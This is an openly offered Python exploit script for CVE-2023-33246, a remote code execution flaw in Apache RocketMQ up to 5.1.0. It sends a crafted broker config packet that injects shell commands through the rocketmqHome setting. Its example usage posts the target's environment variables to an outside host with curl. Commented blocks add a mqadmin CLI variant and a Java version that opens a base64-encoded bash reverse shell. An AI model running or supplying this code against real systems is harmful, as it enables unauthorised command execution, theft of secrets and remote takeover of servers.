# RocketMQ <= 5.1.0 exploit
# see https://blogs.juniper.net/en-us/threat-research/cve-2023-33246-apache-rocketmq-remote-code-execution-vulnerability
#
# Example usage:
#
#   python3 exploit.py rmq-broker 10911 'env|curl -X POST --data-binary @- poc'
#
import socket
import sys


def send_data(ip: str, port: int, payload: bytes):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.sendall(payload)
    resp = s.recv(1024)
    print(resp)
    s.close()


if "__main__" == __name__:
    if len(sys.argv) < 4:
        print(f"Usage: python3 {sys.argv[0]} <ip> <port> <command>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    payload = " ".join(sys.argv[3:]).strip()

    data = (
        "\x00\x00\x00\x60"
        + '{"code":25,"flag":0,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":395}'
        + "filterServerNums=1"
        + "\x0a"
        + "rocketmqHome=-c $@|sh . echo "
        + payload
        + ";\x0a"
    )

    header = b"\x00\x00\x00" + len(data).to_bytes(1, "big")

    send_data(ip, port, header + str.encode(data))


# CLI exploit
#
# /home/rocketmq/rocketmq-4.9.4/mqadmin updateBrokerConfig -b broker:10911 -k rocketmqHome -v '\-c $@|sh . echo env|curl -X POST --data-binary @- poc;'
# /home/rocketmq/rocketmq-4.9.4/mqadmin updateBrokerConfig -b broker:10911 -k filterServerNums -v 1


# Original Java exploit
#
# import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;
#
# import java.util.Base64;
# import java.util.Properties;
#
# public class Main {
#     private static String getCmd(String ip, String port) {
#         String cmd = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
#         String cmdBase = Base64.getEncoder().encodeToString(cmd.getBytes());
#         return "-c $@|sh . echo echo \"" + cmdBase + "\"|base64 -d|bash -i;";
#     }
#
#     public static void main(String[] args) throws Exception {
#         String targetHost = "your-ip";
#         String targetPort = "10911";
#
#         String shellHost = "your-ip";
#         String shellPort = "12345";
#
#         String targetAddr = String.format("%s:%s",targetHost,targetPort);
#         Properties props = new Properties();
#         props.setProperty("rocketmqHome", getCmd(shellHost,shellPort));
#         props.setProperty("filterServerNums", "1");
#         DefaultMQAdminExt admin = new DefaultMQAdminExt();
#         admin.setNamesrvAddr("0.0.0.0:12345");
#         admin.start();
#         admin.updateBrokerConfig(targetAddr, props);
#         Properties brokerConfig = admin.getBrokerConfig(targetAddr);
#         System.out.println(brokerConfig.getProperty("rocketmqHome"));
#         System.out.println(brokerConfig.getProperty("filterServerNums"));
#         admin.shutdown();
#     }
# }
